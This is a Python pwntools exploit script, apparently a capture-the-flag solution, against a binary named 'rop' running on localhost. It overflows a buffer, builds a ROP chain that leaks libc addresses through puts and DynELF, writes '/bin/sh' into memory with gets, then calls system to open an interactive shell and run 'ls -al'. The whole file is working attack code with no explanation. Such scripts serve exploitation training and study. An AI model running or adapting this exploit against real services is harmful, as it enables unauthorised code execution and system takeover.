from pwn import *
r = remote("localhost",5000)
#r=process("./rop")
#pause()
offset=88
bss=0x00602000-0x100
put_plt=0x4004b0
put_got=0x601018 
gets_plt=0x4004d0 
main=0x400500
pop_rdi_ret=0x00000000004006a3 # pop rdi ; ret
def leak(address):
    count=0
    data=''
    payload="A"*offset+p64(pop_rdi_ret)+p64(address)+p64(put_plt)+p64(main)
    r.recvuntil("input :")
    r.sendline(payload)
    r.recvuntil("\n")
    #leaked=r.recvuntil("\n")
    up=""
    buf=""
    while True:
        #c=r.recv(numb=1,timeout=1)
        c=r.recv(1)
        count+=1
        if up=="\n" and c =="R":
                buf=buf[:-1]
                buf+="\x00"
                break
        else:
                buf+=c
        up=c
    data=buf[:8]
#    print data
#    log.info("%#x => %s" % (address, (data or '').encode('hex')))
    sleep(0.1)
    return data


#leak a pointer
#print "leaking :"+ leak(put_got)
payload="A"*offset+p64(pop_rdi_ret)+p64(put_got)+p64(put_plt)+p64(main)
r.recvuntil("input :")
r.sendline(payload)
r.recvuntil("\n")
leaked=r.recvuntil("\n")
leaked=leaked[:-1].ljust(8,"\x00")
leaked=u64(leaked)
#print hex(leaked)

d=DynELF(leak,leaked)
log.info("leaking system ")
systemAddress = d.lookup("__libc_system")
malloc = d.lookup("malloc")
print "system leaked : "+hex(systemAddress)
print "malloc : "+hex(malloc)
log.info("writing /bin/sh")
payload="A"*offset+p64(pop_rdi_ret)+p64(bss)+p64(gets_plt)+p64(main)
sleep(0.1)
r.sendline(payload)
sleep(0.1)
r.sendline("/bin/sh\x00")


log.info("shell :)")
payload="A"*offset+p64(pop_rdi_ret)+p64(bss)+p64(systemAddress)
sleep(0.1)
r.sendline(payload)
sleep(0.1)
r.sendline("ls -al")
r.interactive()
